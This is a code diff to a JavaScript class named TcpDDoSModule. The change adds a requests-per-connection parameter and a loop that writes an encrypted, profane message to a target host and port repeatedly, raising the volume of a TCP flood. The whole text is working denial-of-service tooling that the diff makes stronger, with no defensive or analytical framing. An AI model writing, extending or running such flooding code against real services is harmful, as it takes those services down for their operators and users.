@@ -6,11 +6,12 @@ class TcpDDoSModule {
   #port = 0;
   #requestCount = 0;
 
-  constructor(host, port, ms) {
+  constructor(host, port, ms, rpm) {
     this.client = new Socket();
     this.ms = ms;
     this.#host = host;
     this.#port = port;
+    this.rpm = rpm;
   }
 
   async init() {
@@ -29,11 +30,14 @@ class TcpDDoSModule {
 
     const message = CryptoJS.AES.encrypt("Fuck you asshole", (new Date()).valueOf().toString()).toString();
 
-    await this.client.write(message);
+    for(let i = 0; i <= this.rpm; i++) {
+      await this.client.write(message);
+      this.#requestCount++;
+    }
+
     this._destroyClient();
 
     console.log(`[Request]: Host: ${this.#host}, Port: ${this.#port}, Requests: ${this.#requestCount}`);
-    this.#requestCount++;
   }
 
   _tcpError(err) {
